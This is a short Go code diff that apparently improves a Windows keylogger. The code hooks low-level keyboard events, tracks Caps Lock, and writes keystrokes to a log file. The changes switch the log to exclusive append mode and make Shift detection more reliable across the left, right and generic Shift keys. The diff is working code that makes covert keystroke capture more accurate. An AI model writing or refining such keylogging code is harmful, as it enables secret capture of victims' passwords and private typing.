@@ -19,7 +19,7 @@ func init() {
 	if _, err := os.Stat(logFilePath); os.IsNotExist(err) {
 		logFile, _ = os.Create(logFilePath)
 	} else {
-		logFile, _ = os.OpenFile(logFilePath, os.O_RDWR, os.ModeAppend)
+		logFile, _ = os.OpenFile(logFilePath, os.O_WRONLY|os.O_APPEND, os.ModeExclusive)
 	}
 	windows.GetKeyboardState(&KState)
 	caps = KState[windows.VKCAPITAL] == 1
@@ -35,7 +35,9 @@ func Log(nCode int, wParam windows.WPARAM, lParam uintptr) windows.LRESULT {
 	//WM_KEYDOWN 0x100
 	if nCode == 0 && wParam == 0x100 {
 		key := (*windows.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
-		shiftchk := windows.GetKeyState(windows.VKLSHIFT) & 0x8000
+		shiftchk := (windows.GetAsyncKeyState(windows.VKLSHIFT) & 0x8000) |
+			(windows.GetAsyncKeyState(windows.VKRSHIFT) & 0x8000) |
+			(windows.GetAsyncKeyState(windows.VKSHIFT) & 0x8000)
 		if shiftchk == 32768 {
 			shift = true
 		} else {
